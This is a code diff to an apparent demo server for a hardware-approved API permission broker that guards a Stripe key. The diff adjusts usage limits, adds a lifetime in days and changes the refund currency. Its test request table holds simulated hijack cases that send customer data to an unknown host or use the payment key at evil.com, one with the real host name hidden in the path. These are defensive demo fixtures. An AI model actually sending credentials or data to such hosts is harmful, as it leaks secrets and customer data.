@@ -30,7 +30,8 @@ const KEY = keccak256(toHex(KEY_LABEL))
 // One loan covers both a quiet read and a heavy charge (decision 13): the real 0G judges by whether
 // money moves, not by the amount, so a $12 charge would wake the Ledger just like a $4,800 one.
 const RANGE = { target: 'api.stripe.com', scope: '* /v1' }
-const STANDING_USES = 10
+const STANDING_USES = 20
+const STANDING_DAYS = 7
 const now = () => Math.floor(Date.now() / 1000)
 
 // What the tool tries. `what` is the request in a person's words.
@@ -38,17 +39,19 @@ const now = () => Math.floor(Date.now() / 1000)
 // `what` is the request in a person's words.
 const REQUESTS = {
   // Every morning it looks up who has not paid yet. Reading only.
-  usual: { what: 'Check which orders are still unpaid', method: 'GET', url: 'https://api.stripe.com/v1/invoices?status=open&limit=50' },
+  usual: { what: 'Read the unpaid invoices', method: 'GET', url: 'https://api.stripe.com/v1/invoices?status=open&limit=50' },
   // A customer sent a bag back and the owner asked for the refund. Money leaves her account, so this
   // needs her hand even though she asked for it. The real 0G reads a refund as `decisive` most of the
   // time and `significant` about one time in three, so the demo runs with ZG_ESCALATE=significant:
   // anything where money moves asks for a press (tools/demo-up.sh sets it).
-  heavy: { what: 'Refund $62 for order #1042 (a returned bag)', method: 'POST', url: 'https://api.stripe.com/v1/refunds',
-    body: JSON.stringify({ charge: 'ch_order_1042', amount: 6200, currency: 'usd', reason: 'requested_by_customer' }) },
-  'denied-host': { what: 'Use your payment key at evil.com', hijacked: true, method: 'POST', url: 'https://evil.com/v1/charges' },
+  heavy: { what: 'Refund ₹4,800 for order #1042 (a returned bag)', method: 'POST', url: 'https://api.stripe.com/v1/refunds',
+    body: JSON.stringify({ charge: 'ch_order_1042', amount: 480000, currency: 'inr', reason: 'requested_by_customer' }) },
+  // A wrong decision at three in the morning: the tool tries to send data somewhere nobody allowed.
+  // `.example` is a reserved name: nothing can be reached there, and the Broker refuses before anything leaves.
+  'denied-host': { what: 'Send customer data to files.unknown-host.example', hijacked: true, method: 'POST', url: 'https://files.unknown-host.example/upload' },
   'denied-sneak': { what: 'Use your payment key at evil.com, with the right name hidden in the path', hijacked: true, method: 'POST', url: 'https://evil.com/api.stripe.com/v1/charges' },
 }
-REQUESTS.stopped = { ...REQUESTS.heavy, what: 'Refund $62 for order #1042 — while 0G cannot be reached' }
+REQUESTS.stopped = { ...REQUESTS.heavy, what: 'Refund ₹4,800 for order #1042 — while 0G cannot be reached' }
 const KEYS = { 1: 'usual', 2: 'heavy', 3: 'denied-host', 4: 'denied-sneak', 5: 'stopped' }
 
 // ── what happened, in order. The page reads this. ──
@@ -134,7 +137,7 @@ let busy = false
 let softWait = null    // resolve(true|false) while the page's own button stands in for the Ledger
 
 /** Ask the person for a Permit. On the Ledger if there is one. Resolves when they hold or decline. */
-async function ask(uses, why, rid) {
+async function ask(uses, why, rid, days) {
   // A key that was lent on the Ledger is never continued with a software key. If the device
   // has gone quiet, wait for it; if it does not come back, the answer is no.
   const mustBeDevice = Boolean(standing?.device) && why !== 'lend'
@@ -144,7 +147,7 @@ async function ask(uses, why, rid) {
     device = await deviceReady(90000)
     if (!device) { emit({ type: 'declined', rid, why, error: 'the Ledger did not answer' }); return { error: 'the Ledger did not answer' } }
   }
-  const fields = { skill: skillIdFrom(skill.address), version: TOOL.version, ...RANGE, maxCalls: uses, expiry: now() + 3600, nonce: Date.now() }
+  const fields = { skill: skillIdFrom(skill.address), version: TOOL.version, ...RANGE, maxCalls: uses, expiry: now() + (why === 'lend' ? Math.round((days || STANDING_DAYS) * 86400) : 3600), nonce: Date.now() }
   // The four lines shown on the page come from lines(), the same function the Broker uses on the
   // signed Permit. The page never writes its own version of the range.
   const shown = lines({ holder: softHolder.address, key: KEY, ...fields })
@@ -185,10 +188,12 @@ async function use(signed, id, rid, pressed) {
   return r.body
 }
 
-async function lend() {
+// The page may pick how many uses and for how many days (within sane bounds). Everything else is fixed.
+async function lend({ uses, days } = {}) {
   if (busy) return { ok: false, error: 'busy' }
   busy = true
-  try { const p = await ask(STANDING_USES, 'lend'); if (!p.error) standing = p; return { ok: !p.error } } finally { busy = false }
+  const u = Math.min(100, Math.max(1, Math.round(Number(uses) || STANDING_USES))), d = Math.min(30, Math.max(1, Number(days) || STANDING_DAYS))
+  try { const p = await ask(u, 'lend', undefined, d); if (!p.error) standing = p; return { ok: !p.error } } finally { busy = false }
 }
 
 async function run(id) {
@@ -228,10 +233,10 @@ const routes = {
     try { broker = await (await fetch(BROKER + '/health', { signal: AbortSignal.timeout(1500) })).json() } catch {}
     return { ok: true, broker: BROKER, brokerUp: Boolean(broker), simulated: Boolean(broker?.zg?.simulated), execute: Boolean(broker?.execute), worldSimulated: Boolean(broker?.world?.simulated),
       model: broker?.zg?.model, device: pageReady() || Date.now() - deviceSeen < (busy ? 600000 : 20000), via: pageReady() ? 'page' : null, lent: Boolean(standing), deaf: Boolean(DEAF),
-      tool: TOOL, range: { key: KEY_LABEL, ...RANGE, uses: STANDING_USES }, skill: skillIdFrom(skill.address), version: TOOL.version }
+      tool: TOOL, range: { key: KEY_LABEL, ...RANGE, uses: STANDING_USES, days: STANDING_DAYS }, skill: skillIdFrom(skill.address), version: TOOL.version }
   },
   'GET /events': async (_, url) => { const since = Number(url.searchParams.get('since') ?? 0); return { epoch, events: events.slice(since), busy } },
-  'POST /lend': async () => { lend(); return { ok: true } },          // answers at once; the outcome arrives as events
+  'POST /lend': async (body) => { lend(body); return { ok: true } },          // answers at once; the outcome arrives as events
   'POST /run': async ({ id }) => { run(id); return { ok: true } },
   'POST /hold': async ({ ok = true }) => { if (softWait) softWait(Boolean(ok)); return { ok: Boolean(softWait) } },
   // Lighting a light is for the person who lent the key. The page starts World itself, but the
